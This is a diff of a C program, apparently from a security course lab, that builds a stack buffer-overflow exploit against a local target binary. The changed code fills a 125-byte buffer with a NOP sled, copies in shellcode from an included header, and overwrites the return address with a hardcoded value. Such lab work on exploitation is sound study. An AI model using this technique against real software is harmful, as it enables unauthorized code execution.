@@ -5,7 +5,8 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
-#define NOP "\0x90"
+#define NOP '\x90'
+#define ADDR 0x3021fe50
 
 int
 main ( int argc, char * argv[] )
@@ -13,22 +14,20 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 
-	char exploit[256];
-	strcpy(exploit, NOP);
+	char exploit[125];
+	
 	int i=0;
-	for(i=0;i<15;i++){
-	  strcat(exploit, NOP);
+	for(i=0;i<125;i++){
+		exploit[i] = NOP;
 	}
-	strcat(exploit, shellcode);
-	int remain = (strlen(exploit)+1)%4;
-	if(remain !=0){
-	  for(i=0;i<=remain;i++){
-	    strcat(exploit, NOP);
-	  }
+	for(i=75;i<120;i++){
+		exploit[i]=shellcode[i-75];
 	}
-	while(strlen(exploit)<=120){
-	  strcat(exploit, "\x10\xfe\x21\x20");
-	}
+	
+	int *a = (int*)&exploit[120];
+	*a = ADDR;
+	
+	exploit[124] = '\0';
 	
 	args[0] = TARGET;
 	args[1] = exploit;
